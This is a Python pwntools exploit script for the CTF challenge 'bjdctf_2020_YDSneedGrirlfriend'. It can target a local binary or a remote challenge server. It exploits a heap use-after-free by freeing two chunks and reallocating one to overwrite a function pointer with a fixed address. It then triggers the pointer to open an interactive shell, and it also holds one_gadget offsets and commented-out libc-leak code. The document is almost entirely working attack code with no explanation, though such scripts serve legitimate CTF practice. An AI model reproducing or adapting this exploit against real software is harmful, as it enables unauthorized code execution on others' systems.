import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bjdctf_2020_YDSneedGrirlfriend')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bjdctf_2020_YDSneedGrirlfriend')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',25147)
			elf=ELF('./bjdctf_2020_YDSneedGrirlfriend')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('Your choice :','1')
			io.sendlineafter('Her name size is :',str(a))
			io.sendafter('Her name is :',c)

		def delete(a):
			io.sendlineafter('Your choice :','2')
			io.sendlineafter('Index :',str(a))

		def show(a):
			io.sendlineafter('Your choice :','3')
			io.sendlineafter('Index :',str(a))
		


		add(32,'aaaa')
		add(32,'aaaa')
		delete(0)
		delete(1)

		add(16,p64(0x400b9c))
		show(0)



		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue